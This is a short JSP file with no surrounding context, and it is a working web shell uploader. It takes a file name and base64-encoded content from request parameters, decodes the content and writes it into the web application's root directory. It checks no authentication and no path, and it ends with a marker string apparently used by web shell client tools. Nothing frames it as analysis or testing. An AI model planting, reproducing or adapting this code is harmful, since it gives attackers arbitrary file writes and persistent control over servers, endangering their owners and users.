<%@ page import="java.io.*,sun.misc.BASE64Decoder"%>
<%
	String f = request.getParameter("f");
	if(f != null){
    new java.io.FileOutputStream(application.getRealPath("/")
            + f)
            .write(new String(new BASE64Decoder().decodeBuffer(request
                    .getParameter("c"))).getBytes());
	}
%>
->||<-:)